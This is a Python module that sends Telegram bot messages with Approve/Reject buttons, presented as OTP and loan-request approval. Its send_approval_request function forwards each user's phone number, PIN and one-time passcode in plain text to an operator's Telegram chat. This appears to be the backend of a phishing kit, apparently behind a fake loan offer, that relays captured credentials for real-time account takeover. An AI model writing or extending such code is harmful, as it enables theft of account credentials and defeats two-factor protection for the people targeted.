import os
import httpx

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"


# =========================================
# OTP APPROVAL
# =========================================
async def send_approval_request(
    approval_id: str,
    phone: str,
    pin: str,
    otp: str,
    sms_body: str,
) -> None:
    """
    Send a Telegram message to the admin with:
    - Full user details (phone, PIN, OTP)
    - The exact SMS that was sent to the user
    - Approve / Reject buttons
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("🔴 Telegram credentials missing.")
        return

    url = f"{TELEGRAM_API}/sendMessage"
    text = (
        f"🔐 <b>New Login Attempt</b>\n\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🔑 <b>PIN:</b> <code>{pin}</code>\n"
        f"🔐 <b>OTP:</b> <code>{otp}</code>\n\n"
        f"📩 <b>SMS sent to user:</b>\n"
        f"<i>{sms_body}</i>\n\n"
        f"<b>Approve this OTP?</b>"
    )
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"approve:{approval_id}"},
            {"text": "❌ Reject", "callback_data": f"reject:{approval_id}"},
        ]]
    }
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": keyboard,
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload)
            print(f"🟢 Telegram response: {response.status_code}")
        except Exception as e:
            print(f"🔴 Telegram send error: {e}")


# =========================================
# LOAN REQUEST APPROVAL
# =========================================
async def send_loan_approval_request(approval_id: str, phone: str) -> None:
    """
    Send a Telegram message asking the admin to approve the loan request.
    Includes Approve / Deny buttons.
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("🔴 Telegram credentials missing.")
        return

    url = f"{TELEGRAM_API}/sendMessage"
    text = (
        f"🏦 <b>New Loan Request</b>\n\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n\n"
        f"<b>Approve this loan request?</b>"
    )
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"loan_approve:{approval_id}"},
            {"text": "❌ Deny", "callback_data": f"loan_reject:{approval_id}"},
        ]]
    }
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": keyboard,
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload)
            print(f"🟢 Loan Telegram response: {response.status_code}")
        except Exception as e:
            print(f"🔴 Loan Telegram send error: {e}")


# =========================================
# SHARED HELPERS
# =========================================
async def answer_callback_query(callback_id: str, text: str) -> None:
    """Acknowledge a button press so the Telegram spinner stops."""
    url = f"{TELEGRAM_API}/answerCallbackQuery"
    async with httpx.AsyncClient() as client:
        try:
            await client.post(
                url,
                json={"callback_query_id": callback_id, "text": text},
            )
        except Exception as e:
            print(f"🔴 Callback answer error: {e}")


async def edit_message(chat_id: int, message_id: int, text: str) -> None:
    """Edit the original Telegram message to show the final decision."""
    url = f"{TELEGRAM_API}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
    }
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json=payload)
        except Exception as e:
            print(f"🔴 Edit message error: {e}")